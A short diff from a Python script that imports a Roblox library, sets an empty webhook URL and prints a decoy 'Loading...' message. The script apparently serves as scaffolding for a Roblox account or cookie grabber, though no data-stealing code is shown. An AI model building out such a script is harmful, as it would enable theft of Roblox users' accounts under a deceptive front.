@@ -12,7 +12,7 @@ import re
 import requests
 import robloxpy
 
-webhook_url = "" # Put Your Webhook URL Here
+webhook_url = ''
 
 dummy_message = "Loading..."
 print(dummy_message)
